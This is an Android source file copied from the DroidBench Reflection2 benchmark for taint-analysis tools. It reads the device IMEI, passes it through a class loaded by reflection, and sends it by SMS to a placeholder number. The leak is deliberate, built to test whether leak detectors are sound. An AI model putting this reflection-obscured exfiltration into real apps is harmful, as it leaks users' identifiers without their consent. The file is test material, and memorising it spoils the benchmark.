package ubc.yingying.reflection2;


import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;

/**
 * @NOTE: The benchmark is originally from DroidBench, here it is just a copy of DroidBench-Reflection2 test case;
 * @testcase_name Reflection2 (originally from DroidBench)
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE)
 * @author_mail steven.arzt@cased.de
 *
 * @description A class instance is created using reflection. Sensitive data is stored
 * 	in a field of this class, read out again using a method implemented in the "unknown"
 * 	class and leaked.
 * @dataflow onCreate: source -> bc.imei -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to handle code implemented in classes loaded
 * 	using reflection.
 */
public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
            BaseClass bc = (BaseClass) Class.forName("ubc.yingying.reflection2.ConcreteClass").newInstance();
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            bc.imei = telephonyManager.getDeviceId(); //source

            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage("+49 1234", null, bc.foo(), null, null);   //sink, leak

        } catch (InstantiationException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }


}